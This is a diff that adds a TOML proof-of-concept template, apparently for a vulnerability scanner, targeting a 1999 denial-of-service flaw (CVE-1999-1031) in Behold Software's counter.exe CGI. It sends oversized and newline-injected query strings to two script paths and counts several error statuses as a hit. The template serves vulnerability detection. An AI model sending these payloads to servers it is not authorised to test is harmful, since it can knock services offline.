@@ -1,0 +1,101 @@
+[info]
+author = "ave"
+description = "检测 Behold Software Web Page Counter 2.70 counter.exe CGI 程序是否存在拒绝服务漏洞。该漏洞通过向 counter.exe 传递超长参数（>2200字符）或包含换行符（%0A）的参数，可导致程序挂起或访问违例，造成拒绝服务。"
+id = "POC-AVE-1999-0886"
+name = "Behold Software Web Page Counter counter.exe 拒绝服务漏洞 PoC"
+severity = "medium"
+tags = ["ave-1999-0886"]
+vuln_id = [
+    "CVE-1999-1031",
+    "AVE-1999-0886",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/scripts/counter.exe?{{long_arg}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+    400,
+    404,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/scripts/counter.exe?%0A"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+    400,
+    404,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/counter.exe?{{long_arg}}"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+    400,
+    404,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/cgi-bin/counter.exe?%0A"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+    400,
+    404,
+]
+type = "status"
+
+[poc.variables]
+long_arg = "{{repeat('A', 2300)}}"
